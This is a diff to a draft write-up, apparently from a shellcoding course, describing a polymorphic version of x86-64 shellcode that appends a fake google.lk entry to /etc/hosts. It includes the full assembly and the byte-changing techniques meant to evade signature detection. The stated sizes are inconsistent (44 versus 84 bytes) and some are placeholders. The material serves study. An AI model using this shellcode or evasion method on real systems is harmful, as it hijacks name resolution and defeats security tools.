@@ -161,7 +161,7 @@ pop rsi        ==>       inc rsi
 * Description: Adds entry in the `/etc/hosts` file
 * Original Shellcode Size: 110 bytes
 * Max Size of the polymorphic Version: 165 bytes
-* Size of the Created Polymorphic Version: **XXX bytes (below the 150%)**
+* Size of the Created Polymorphic Version: **44 bytes for V1 and XX for V2 (below the 150%)**
 
 The original ASM file:
 ```asm
@@ -215,9 +215,52 @@ The following techniques are applied to polymorph the code:
 1. Replace the Stack Technique used to store the `/etc/hosts` string by Relative Address Technique
 2. Replace the JMP-CALL-POP by Relative Address 
 3. Lot of `mov` instructions that can be replaced by `jmp;pop`
-4. 
+4. Several `add` after a `xor` that can be replaced by `push;pop`
+The polymorphic code results in a reduced version of 84 bytes:
+```asm
+global _start
+    section .text
 
-v
+_start:
+
+        jmp real_start
+        text db "127.1.1.1 google.lk"   ; 19 bytes
+        path db "/etc/hosts", 0x00      ; 10 bytes
+
+real_start:
+
+    ;open
+    push 2
+    pop rax
+    ; Instead the stack for the string, use rel addressing
+    lea rdi, [rel path]
+    push 0x401
+    pop rsi
+    syscall
+
+    ;write
+    push rax
+    pop rdi
+    xor rax, rax
+    inc rax
+
+write:
+    lea rsi, [rel text]
+    push 19
+    pop rdx
+    syscall
+
+    ;close
+    push 3
+    pop rax
+    syscall
+
+    ;exit
+    push 60
+    pop rax
+    xor rdi, rdi
+    syscall
+```
 
 
 
